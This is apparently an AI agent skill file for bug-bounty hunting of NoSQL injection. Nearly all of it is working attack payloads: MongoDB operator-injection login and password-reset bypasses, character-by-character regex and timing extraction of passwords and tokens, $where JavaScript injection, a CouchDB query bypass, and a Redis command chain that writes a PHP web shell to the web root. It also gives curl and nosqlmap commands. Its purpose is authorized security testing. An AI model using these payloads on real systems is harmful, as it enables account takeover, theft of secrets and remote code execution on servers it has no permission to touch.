---
name: nosql-injection-testing
description: "NoSQL injection hunting — MongoDB operator injection ($ne/$gt/$regex/$where), authentication bypass with operator objects, blind extraction via $regex, JavaScript injection through $where and mapReduce, CouchDB Mango queries, and Redis command injection. Use when testing MEAN/MERN stacks, Express/Node.js APIs, Mongoose-backed login and password-reset flows, or any endpoint whose JSON body is passed straight into a document-store query."
---

# NoSQL Injection (NoSQLi) Techniques

## Crown Jewel Targets

- **MEAN/MERN stack startups** — Express + MongoDB with direct query construction, minimal input sanitization (Critical auth bypass bounties)
- **Node.js REST APIs** with body-parser — `req.body.password` directly in `findOne()` accepts operator objects
- **E-commerce search/filter APIs** — MongoDB aggregation pipelines with user-controlled `$match` stages
- **Chat/messaging platforms** on MongoDB — `$regex` extraction of message content, tokens, API keys
- **IoT/dashboard platforms** on CouchDB — `_find` endpoint Mango queries with operator injection
- **Redis-backed session stores** — command injection via newline in session data → RCE via CONFIG SET
- **Password reset flows** on Node.js — token bypass via `{"$ne": null}` in reset token validation

## Attack Surface Signals

- **URL patterns**: `/api/v1/users`, `/api/login`, `/api/search`, `/api/filter`, `/_find` (CouchDB)
- **Response headers**: `X-Powered-By: Express`, MongoDB ObjectId patterns (`5f3d...` 24-char hex)
- **Response body patterns**: `"_id":"ObjectId(...)"`, `MongoError`, `CastError`, Mongoose validation errors
- **Tech stack signals**: MEAN/MERN stack, Express.js, Mongoose, Mongolab/Atlas connection strings in errors
- **JS bundle patterns**: `mongoose`, `mongodb`, `MongoClient`, `findOne`, `aggregate`, `$match`
- **Error messages**: `SyntaxError: Unexpected token`, `BSONTypeError`, `$ne`, `$gt` in stack traces

## Quick Reference
NoSQLi exploits unsanitized input in NoSQL database queries. Unlike SQLi, attacks use **operator injection** and **JavaScript execution** rather than breaking SQL syntax.

## The two types — decide which one you are testing

They need different payloads, so establish this first:

- **Syntax injection** — you break out of the query *string* the way you would with SQLi. Applies where the app concatenates input into a `$where` clause or a query string.
- **Operator injection** — you do not break syntax at all; you replace a scalar with a **query operator object** so the comparison changes meaning. This is the more common and more productive of the two on JSON APIs.

## Detection — syntax injection

Fuzz string covering every character that has meaning in a Mongo query:
```
'"`{
;$Foo}
$Foo \xYZ%00
```
URL-encoded: `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

Any change in behaviour means characters are reaching the query. Then confirm it is *conditional*, not just an error, with a boolean pair:
```
fizzy' && 0 && 'x        → no results
fizzy' && 1 && 'x        → results returned
fizzy'||'1'=='1          → all results (returns more than the original)
```
A response difference across that pair is confirmation; an error alone is not.

**Null byte truncation** — if the query appends further conditions (`&& this.released == 1`) that hide unreleased records, terminate the string early so the rest is ignored:
```
fizzy'%00
```

## Detection — operator injection

Where the app sends `{"username":"wiener"}`, substitute an operator object:
```json
{"username":{"$ne":"invalid"}}
```
In URL-encoded bodies the same idea is expressed as `username[$ne]=invalid`. If the endpoint is `GET` or form-encoded, try converting it to `POST` with `Content-Type: application/json` first — many apps accept both, and only the JSON path allows nested operators.

Progression on a login endpoint:
```json
{"username":{"$ne":"invalid"},"password":"peter"}                          // is username injectable?
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}                // log in as the first user in the collection
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}   // target a privileged account
```

## Detection - Fuzz Characters
```
$ { } \ " ` ; %00
```
Inject in every parameter. Watch for: status code changes, content-length diffs, error messages, timing differences.

## MongoDB Operator Injection

### Core Operators for Injection
| Operator | Purpose | Payload |
|----------|---------|---------|
| `$ne` | Not equal (always true) | `{"field": {"$ne": null}}` |
| `$gt` | Greater than (always true) | `{"field": {"$gt": ""}}` |
| `$regex` | Regex match (data extraction) | `{"field": {"$regex": "^a"}}` |
| `$where` | JS execution | `{"$where": "sleep(5000)"}` |
| `$exists` | Field exists | `{"field": {"$exists": true}}` |
| `$in` | Match array | `{"field": {"$in": ["admin"]}}` |
| `$nin` | Not in array | `{"field": {"$nin": []}}` |

### Auth Bypass - JSON Body
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": null}}
```

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$gt": ""}}
```

### Auth Bypass - URL-encoded (Parameter Pollution)
```
username=admin&password[$ne]=null
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
```
This works when Express/body-parser converts `param[$op]=val` into `{param: {$op: val}}`.

### Password Reset Token Bypass
```http
POST /auth/reset-password HTTP/1.1
Content-Type: application/json

{
  "email": "admin@target.com",
  "token": {"$ne": null},
  "newPassword": "hacked123"
}
```

### Extract All Usernames (Regex Enumeration)
```json
{"username": {"$regex": "^a"}, "password": {"$ne": null}}
{"username": {"$regex": "^ad"}, "password": {"$ne": null}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
```
Automate character-by-character extraction. Works for any field: passwords, tokens, API keys.

## Blind NoSQLi

### Boolean-Based
Compare responses when injecting true vs false conditions:
```json
// True condition - normal response
{"username": "admin", "password": {"$ne": "wrong"}}

// False condition - different response  
{"username": "admin", "password": {"$eq": "wrong"}}
```

### Time-Based ($where)
```json
{
  "username": "admin",
  "password": {
    "$where": "if(this.password.startsWith('a')){sleep(5000);return true;}else{return true;}"
  }
}
```
Measure response time to extract data character by character.

### Regex-Based Blind
```json
{"username": {"$regex": "^admin"}, "password": {"$regex": "^p.{5}$"}}
```
Use regex length/pattern matching when no direct output.

## JavaScript Injection ($where / mapReduce)

### String Concatenation Exploit
If backend does:
```javascript
db.users.find({$where: "this.email == '" + email + "'"})
```
Inject:
```
email=a'||true;//
email=a'; return true;//
email=a'; sleep(5000);//
```

### Mass Data Access
```
email=user@test.com'||true;//&token=
```
Results in: `this.email == 'user@test.com' || true; //...` - matches ALL documents.

### Extracting data through syntax injection

Once `$where` accepts your input, the known-record trick turns it into an oracle — a match means the condition was true:

```
admin' && this.password[0] == 'a' || 'a'=='b        # character by character
admin' && this.password.match(/\d/) || 'a'=='b      # narrow the charset before brute-forcing
```

**Discover field names before extracting values** — a non-existent field errors or fails, an existing one does not:
```
admin' && this.username!='          # returns admin  → field exists
admin' && this.foo!='               # no result      → field does not exist
```

In an **operator injection** context you can do the same without breaking syntax, by smuggling `$where` in as an extra key:
```json
{"username":"wiener","password":"peter","$where":"0"}    // no result
{"username":"wiener","password":"peter","$where":"1"}    // result  → $where is honoured
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}      // enumerate field names character by character
```

### Timing-based extraction

When nothing differs in the response, make the server stall on a true condition:
```javascript
{"$where": "sleep(5000)"}                                                  // baseline: is $where live?
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'          // conditional sleep
admin'+function(x){var waitTill=new Date(new Date().getTime()+5000);while((x.password[0]==="a")&&waitTill>new Date()){};}(this)+'   // busy-wait where sleep() is unavailable
```

## Second-Order NoSQLi
Payload stored first (e.g., in profile field, queue message), then executed when retrieved and used in a query later. Test stored inputs that feed into backend queries.

## CouchDB Injection
CouchDB uses REST API with JSON. Target `_find` endpoint:
```http
POST /dbname/_find HTTP/1.1
Content-Type: application/json

{
  "selector": {
    "username": "admin",
    "password": {"$ne": "x"}
  }
}
```

Mango query operators: `$gt`, `$lt`, `$ne`, `$regex`, `$exists`, `$in`, `$or`, `$and`.

## Redis Injection
Redis uses command-based protocol. If input concatenated into commands:
```
# Normal: GET user:admin
# Inject newline to chain commands:
admin\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload "<?php system($_GET['c']); ?>"
```

## Tools

### nosqlmap
```bash
# Auth bypass
python nosqlmap.py -u "http://target/login" -p username,password

# Enumeration
python nosqlmap.py -u "http://target/api" --enum
```

### Manual with curl
```bash
# Operator injection
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# Regex extraction
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^a"},"password":{"$ne":""}}'
```

### Burp Suite
1. Intercept login request
2. Change `"password":"test"` to `"password":{"$ne":null}`
3. For URL-encoded: change `password=test` to `password[$ne]=null`
4. Use Intruder with `$regex` payloads for extraction

### Nuclei Templates
```bash
nuclei -t http/vulnerabilities/nosqli/ -u https://target.com
```

## Common Vulnerable Patterns (Code Review)
```javascript
// VULNERABLE - direct user input in query
db.users.findOne({email: req.body.email, password: req.body.password})

// VULNERABLE - $where with concatenation
db.users.find({$where: "this.name == '" + name + "'"})

// SAFE - explicit type casting
db.users.findOne({email: String(req.body.email), password: String(req.body.password)})

// SAFE - sanitize-mongo or mongo-sanitize
const sanitize = require('mongo-sanitize');
db.users.findOne({email: sanitize(req.body.email)})
```

## Bug Bounty Checklist
1. **Identify NoSQL backend**: Error messages mentioning MongoDB/Mongoose, tech stack detection (MEAN/MERN), `ObjectId` patterns in responses
2. **Test every input**: Login forms, search, API filters, password reset, registration
3. **Try both formats**: JSON body (`{"$ne":null}`) AND URL-encoded (`param[$ne]=null`)
4. **Auth bypass first**: Highest impact, easiest to prove
5. **Extract data with $regex**: Prove data exfiltration for higher severity
6. **Check $where support**: If enabled, JS execution = critical severity
7. **Test array parameters**: `id[]=1&id[]=2` may bypass type checks
8. **Second-order vectors**: Profile fields, stored preferences used in queries later

## Severity Ratings
| Impact | Severity | Example |
|--------|----------|---------|
| Auth bypass + account takeover | Critical | Login bypass with `$ne` |
| Data extraction (PII/secrets) | High | `$regex` password/token extraction |
| Unauthorized data access | High | Bypassing query filters |
| DoS via `$where` sleep | Medium | `sleep(99999)` in `$where` |
| Information disclosure | Medium | Error-based DB enumeration |

## PortSwigger Academy — Advanced Techniques

- **Null byte truncation**: `category=fizzy'%00` — strips trailing conditions like `&& this.released == 1`
- **$where injection via extra JSON key**: `{"username":"x","password":"y","$where":"1"}` — inject server-side JS
- **Field name enumeration via keys()**: `"$where":"Object.keys(this)[0].match('^.{0}a.*')"` — character-by-character extraction
- **Content-Type conversion bypass**: Convert GET to POST `application/json` — JSON body accepts nested objects with `$ne`, `$regex`
- **Timing-based blind extraction**: `admin'+function(x){var waitTill=new Date(new Date().getTime()+5000);while((x.password[0]==="a")&&waitTill>new Date()){};}(this)+'`
- **MongoDB fuzz string**: `'"\`{%0d%0a;$Foo}%0d%0a$Foo \xYZ%00`

## Operator Notes (Battle-Tested)

1. **Always test BOTH JSON body AND URL-encoded formats**: `{"password":{"$ne":null}}` and `password[$ne]=null`. Many targets parse one but not the other — Express body-parser handles both when `extended: true`.
2. **Auth bypass is the highest-ROI first test**: Try `$ne`/`$gt` on login before anything else. If it works, you have Critical severity in 30 seconds. If login uses `String()` casting, move to `$regex` extraction on other endpoints.
3. **`$regex` extraction is slow but devastating**: Automate character-by-character extraction with a script. Start with `^a`, `^b`... and binary-search refinement. Works on passwords, tokens, API keys — anything stored in Mongo.
4. **Content-Type conversion is underused**: Convert GET requests to `POST application/json` — many APIs accept nested objects in JSON that they would not accept in URL params. This bypasses filters that only check URL parameters.
5. **nosqlmap is outdated but useful for first pass**: Run `nosqlmap.py` for quick detection, then switch to manual curl for extraction and bypass work. Burp Intruder with `$regex` payloads is the most reliable extraction method.

## Related Skills & Chains

| When | Go to |
|------|-------|
| NoSQLi found on login endpoint | `auth-bypass-testing` (escalate to full ATO) |
| WAF blocks `$ne`/`$gt` operators | `waf-bypass` (encoding, Content-Type swap) |
| Need to discover hidden API parameters | `hidden-param-discovery` |
| MongoDB behind Node.js API | `api-security-testing` (full API surface mapping) |
| Found `$where` JS execution | `command-injection-techniques` (RCE chain) |
| Redis command injection confirmed | `ssrf-to-rce-chain` (pivot to internal network) |

---

## Skill metadata

- **Pattern**: NoSQL Injection (NoSQLi) Techniques
- **Severity**: High-Critical
- **Tech**: mongodb, redis, couchdb, dynamodb, nodejs, python
- **Triggers**: `/test-sqli`, `nosql injection`, `nosqli`, `mongodb injection`, `operator injection`, `$ne`, `$regex`
- **Related skills**: auth-bypass-testing, api-security-testing, hidden-param-discovery, waf-bypass
- **Sources**: portswigger-academy, hackerone-reports
